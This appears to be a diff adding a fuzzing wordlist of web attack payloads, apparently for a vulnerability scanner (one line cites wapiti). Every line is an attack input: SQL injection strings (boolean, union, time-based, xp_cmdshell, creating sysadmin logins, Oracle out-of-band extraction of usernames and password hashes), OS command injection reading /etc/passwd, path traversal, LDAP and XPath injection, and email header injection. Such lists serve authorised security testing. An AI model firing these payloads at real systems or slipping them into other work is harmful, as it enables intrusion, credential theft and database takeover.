@@ -1,0 +1,1111 @@
+'
+'--
+' or 1=1--
+1 or 1=1--
+' or 1 in (@@version)--
+1 or 1 in (@@version)--
+'; waitfor delay '0:30:0'--
+1; waitfor delay '0:30:0'--
+'||Utl_Http.request('http://<yourservername>') from dual--
+1||Utl_Http.request('http://<yourservername>') from dual--
+xsstest
+xsstest%00"<>'
+</foo>
+<foo></foo>
+))))))))))
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+| ping -i 30 127.0.0.1 |
+| ping -n 30 127.0.0.1 |
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+; ping 127.0.0.1 ;
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+xyz' OR 1%3D1+--
+xyz'  OR 1%253D1+--
+`id`
+(select 99999999 from pg_sleep(15)) as test
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999
+999999 or 1=1 or 1=1
+' or 1=1 or '1'='1
+" or 1=1 or "1"="1
+999999) or 1=1 or (1=1
+') or 1=1 or ('1'='1
+") or 1=1 or ("1"="1
+999999)) or 1=1 or ((1=1
+')) or 1=1 or (('1'='1
+")) or 1=1 or (("1"="1
+999999))) or 1=1 or (((1
+'))) or 1=1 or ((('1'='1
+"))) or 1=1 or ((("1"="1
+1 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or 1=1
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test
+9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999
+9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999
+9999'+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'9999
+9999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"9999
+9999'||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'9999
+9999"||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||"9999
+(select like('abcdefg',upper(hex(randomblob(150000000))))) as test
+(select like('abcdefg',upper(hex(randomblob(150000000)))))
+9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) as test
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+9999'||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'9999
+9999"||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||"9999
+(select benchmark(15000000,md5(0x4e446b6e))-9999) as test
+benchmark(15000000,md5(0x4e446b6e))-9999
+9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+9999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="9999
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) as test
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+9999'+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+'9999
+9999"+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+"9999
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) as test
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+9999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'9999
+9999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"9999
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3) as test
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)
+9999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'9999
+9999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"9999
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) as test
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+9999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'9999
+9999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"9999
+(select 99999999 from pg_sleep(15)) as test
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999
+1||;select pg_sleep(2); —
+(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(12)))v)+'"+(select(0)from(select(sleep(0)))v)+"*/
+1%20and%20substring(version(),1,1)=5
+(substring(version(),1,1)=5)
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*’XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR’|”XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR”*/
+;echo 111111
+echo 111111
+response.write 111111
+:response.write 111111
+http://<yourservername>/
+<youremail>%0aCc:<youremail>
+<youremail>%0d%0aCc:<youremail>
+<youremail>%0aBcc:<youremail>
+<youremail>%0d%0aBcc:<youremail>
+'
+a' or 1=1--
+"a"" or 1=1--"
+ or a = a
+a' or 'a' = 'a
+1 or 1=1
+a' waitfor delay '0:0:10'--
+1 waitfor delay '0:0:10'--
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+a'
+?
+' or 1=1
+yor 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'
+'%20or%20''='
+'%20or%20'x'='x
+%20or%20x=x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+) or (a=a
+hi or a=a
+hi or 1=1 --"
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+"hi"") or (""a""=""a"
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+<>"'%;)(&+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+a' or 3=3--
+"a"" or 3=3--"
+' or 3=3
+yor 3=3 --
+yor 'a'='a' --
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+;id;
+;id
+;netstat -a;
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+uname -n -s
+whoami
+pwd
+last
+cat /etc/passwd
+ls -la /tmp
+ls -la /home
+ping -i 30 127.0.0.1 
+ping 127.0.0.1
+ping -n 30
++|+Dir+c:\
+$+|+Dir+c:\
+%26%26+|+dir c:\
+$%26%26dir c:\
+%0a+dir+c:\
++|+Dir+c:%255c
+$+|+Dir+c:%255c
+%26%26+|+dir c:%255c
+$%26%26dir+c:%255c
+%0a+dir+c:%255c
++|+Dir+c:%2f
+$+|+Dir+c:%2f
+%26%26+|+dir c:%2f
+$%26%26dir+c:%2f
+%0a+dir+c:%2f
++dir+c:\+|
++|+dir+c:\+|
++|+dir+c:%2f+|
+dir+c:\
+||+dir|c:\
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+# from wapiti
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+' or sleep(__TIME__)#
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(__TIME__)--
+1 or pg_sleep(__TIME__)--
+" or pg_sleep(__TIME__)--
+' or pg_sleep(__TIME__)--
+1) or pg_sleep(__TIME__)--
+") or pg_sleep(__TIME__)--
+') or pg_sleep(__TIME__)--
+1)) or pg_sleep(__TIME__)--
+")) or pg_sleep(__TIME__)--
+')) or pg_sleep(__TIME__)--
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+1
+1 and user_name() = 'dbo'
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+' or username is not NULL or username = '
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 uni/**/on select all from where
+' or '1'='1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
+<>"'%;)(&+
+|
+!
+?
+/
+//
+//*
+'
+' -- 
+(
+)
+*|
+*/*
+&
+0
+031003000270000
+0 or 1=1
+0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
+0x77616974666F722064656C61792027303A303A31302700 exec(@s)
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+1 or 1=1
+1;SELECT%20*
+1 waitfor delay '0:0:10'--
+'%20or%20''='
+'%20or%201=1
+')%20or%20('x'='x
+'%20or%20'x'='x
+%20or%20x=x
+%20'sleep%2050'
+%20$(sleep%2050)
+%21
+23 OR 1=1
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+||6
+'||'6
+(||6)
+%7C
+a'
+admin' or '
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+' and 1 in (select var from temp)--
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+"a"" or 3=3--"
+a' or 3=3--
+a' or 'a' = 'a
+&apos;%20OR
+as
+asc
+a' waitfor delay '0:0:10'--
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+bfilename
+char%4039%41%2b%40SELECT
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @s varchar(22) select @s =
+declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e
+delete
+desc
+distinct
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+exec(@s)
+'; exec ('sel' + 'ect us' + 'er')
+exec sp
+'; execute immediate 'sel' || 'ect us' || 'er'
+exec xp
+'; exec xp_regread
+' group by userid having 1=1--
+handler
+having
+' having 1=1--
+hi or 1=1 --"
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+insert
+like
+limit
+*(|(mail=*))
+*(|(objectclass=*))
+or
+' or ''='
+ or 0=0 #"
+' or 0=0 --
+' or 0=0 #
+" or 0=0 --
